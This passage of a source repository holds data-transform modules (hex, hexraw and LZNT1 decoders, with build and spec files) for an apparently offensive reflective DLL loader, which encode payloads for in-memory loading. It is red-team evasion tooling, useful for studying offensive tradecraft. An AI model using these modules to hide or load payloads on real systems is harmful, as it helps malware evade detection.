 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT WINBOOL WINAPI Crypt32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

void recover(_RESOURCE * rsrc);

/*
 * our recover function, in place recovers our data
 */
void hex_recover(_RESOURCE * rsrc) {
	DWORD out_len;

	/* call the next module */
	recover(rsrc);

	/* since we're in-place decoding, our out buffer is the length of our string */
	out_len = rsrc->length;

	/* decode our value */
	if (!Crypt32$CryptStringToBinaryA((LPCSTR)rsrc->value, rsrc->length, CRYPT_STRING_HEX, (BYTE*)rsrc->value, &out_len, NULL, NULL))
		return;

	/* update our resource length */
	rsrc->length = out_len;
}

```

## File: simple_rdll_transforms/modules/hex/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/hexraw/hexraw.spec

```text
#
# base64 data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for XOR recovery
	load "bin/recover.x86.o"
		merge

	# layer our xor recovery function over recover
	redirect "_recover" "_hexraw_recover"

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "hexraw_recover"

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	encode "hexraw"

apply.x64:
	encode "hexraw"

```

## File: simple_rdll_transforms/modules/hexraw/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/hexraw/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/hexraw/src/recover.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT WINBOOL WINAPI Crypt32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

void recover(_RESOURCE * rsrc);

/*
 * our recover function, in place recovers our base64'd data
 */
void hexraw_recover(_RESOURCE * rsrc) {
	DWORD out_len;

	/* call the next module */
	recover(rsrc);

	/* since we're in-place decoding, our out buffer is the length of our string */
	out_len = rsrc->length;

	/* decode our value */
	if (!Crypt32$CryptStringToBinaryA((LPCSTR)rsrc->value, rsrc->length, CRYPT_STRING_HEXRAW, (BYTE*)rsrc->value, &out_len, NULL, NULL))
		return;

	/* update our resource length */
	rsrc->length = out_len;
}

```

## File: simple_rdll_transforms/modules/hexraw/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/lznt1/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/lznt1/lznt1.spec

```text
#
# lznt1 data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for lznt1 recovery
	load "bin/recover.x86.o"
		merge

	# layer our lznt1 recovery function over recover
	redirect "_recover" "_lznt1_recover"

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "lznt1_recover"

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	encode "lznt1"

apply.x64:
	encode "lznt1"

```

## File: simple_rdll_transforms/modules/lznt1/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/lznt1/src/recover.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

WINBASEAPI LPVOID  WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

DECLSPEC_IMPORT __stdcall NTSTATUS NTDLL$RtlDecompressBuffer(USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG  UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG  CompressedBufferSize, PULONG FinalUncompressedSize);

void recover(_RESOURCE * rsrc);

typedef struct {
	int           uncompressed_size;
	unsigned char data[0];
} LZNT1_PACKAGE;

/*
 * our recover function, in place recovers our xor'd data
 */
void lznt1_recover(_RESOURCE * rsrc) {
	LZNT1_PACKAGE * package = (LZNT1_PACKAGE *)rsrc->value;

	/* call the next module (reverse order) */
	recover(rsrc);

	/* need to allocate memory for our uncompressed data */
	ULONG           finalSize;
	unsigned char * uncompressed = KERNEL32$VirtualAlloc(NULL, package->uncompressed_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* let's decompress our data (check return value == 0 for success) */
	NTDLL$RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, uncompressed, package->uncompressed_size, package->data, rsrc->length - 4, &finalSize);

	/* copy our decompressed data over and update the resource length */
	rsrc->length = (DWORD)finalSize;
	memcpy(rsrc->value, uncompressed, finalSize);

	/* free our temporary buffer */
	KERNEL32$VirtualFree(uncompressed, 0, MEM_RELEASE);
}

```

## File: simple_rdll_transforms/modules/lznt1/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/rc4/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
